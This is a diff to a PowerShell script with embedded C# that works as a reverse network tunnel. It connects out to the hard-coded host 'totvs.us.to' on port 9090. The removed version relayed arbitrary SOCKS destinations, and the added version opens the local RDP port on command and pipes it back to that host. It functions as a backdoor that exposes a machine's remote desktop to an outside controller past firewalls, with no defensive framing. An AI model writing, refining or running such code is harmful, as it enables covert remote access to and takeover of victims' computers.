@@ -1,5 +1,4 @@
-$Server = "totvs.us.to"
-
+$Server="totvs.us.to"
 
 
 Add-Type @"
@@ -10,7 +9,7 @@ using System.Threading.Tasks;
 
 
 
-public class SocksClient
+public class TunnelClient
 {
 
 
@@ -41,6 +40,7 @@ await b.WriteAsync(buffer,0,n);
 
 }
 
+
 }
 catch
 {
@@ -48,22 +48,22 @@ catch
 }
 
 
-try { a.Close(); } catch{}
-try { b.Close(); } catch{}
+
+try {a.Close();}catch{}
+try {b.Close();}catch{}
 
 
 }
 
 
 
-
 static async Task Relay(NetworkStream a, NetworkStream b)
 {
-
 
 await Task.WhenAny(
 
 Pipe(a,b),
+
 Pipe(b,a)
 
 );
@@ -73,8 +73,7 @@ Pipe(b,a)
 
 
 
-
-public static async Task Start(string server)
+public static async Task Start(string host)
 {
 
 
@@ -83,15 +82,15 @@ new TcpClient();
 
 
 
-Console.WriteLine("[*] Conectando tunnel");
+Console.WriteLine("[*] Conectando servidor");
 
 
 
-await tunnel.ConnectAsync(server,9090);
+await tunnel.ConnectAsync(host,9090);
 
 
 
-Console.WriteLine("[+] Tunnel conectado");
+Console.WriteLine("[+] Tunel conectado");
 
 
 
@@ -101,101 +100,51 @@ tunnel.GetStream();
 
 
 byte[] buffer =
-new byte[65536];
+new byte[1024];
 
 
 
-while(true)
-{
-
-
-int n =
+int read =
 await tunnelStream.ReadAsync(buffer,0,buffer.Length);
 
 
 
-if(n <= 0)
-break;
+string cmd =
+Encoding.ASCII.GetString(buffer,0,read);
 
 
 
-string request =
-Encoding.ASCII.GetString(buffer,0,n);
+Console.WriteLine("[+] Control: "+cmd);
 
 
 
-Console.WriteLine("[+] Destino: "+request);
+if(cmd.Trim()=="OPEN")
+{
 
 
-
-string[] p =
-request.Split(':');
-
-
-
-string host =
-p[0];
-
-
-
-int port =
-int.Parse(p[1]);
-
-
-
-// abrir destino
-
-
-TcpClient remote =
+TcpClient rdp =
 new TcpClient();
 
 
 
-await remote.ConnectAsync(host,port);
+Console.WriteLine("[+] Abriendo RDP Local");
 
 
 
-Console.WriteLine(
-"[+] Conectado "+
-host+
-":"+
-port
-);
+await rdp.ConnectAsync("127.0.0.4",3389);
 
 
 
-NetworkStream remoteStream =
-remote.GetStream();
+Console.WriteLine("[+] RDP conectado");
 
 
 
-// responder OK SOCKS
-
-
-byte[] ok =
-{
-0x05,
-0x00,
-0x00,
-0x01,
-0,0,0,0,
-0,
-0
-};
+NetworkStream rdpStream =
+rdp.GetStream();
 
 
 
-await tunnelStream.WriteAsync(ok,0,ok.Length);
-
-
-
-// relay
-
-
-await Relay(
-tunnelStream,
-remoteStream
-);
+await Relay(tunnelStream,rdpStream);
 
 
 
@@ -203,10 +152,10 @@ remoteStream
 
 
 }
-
 
 }
 "@
 
 
-[SocksClient]::Start($Server).GetAwaiter().GetResult()
+
+[TunnelClient]::Start($Server).GetAwaiter().GetResult()
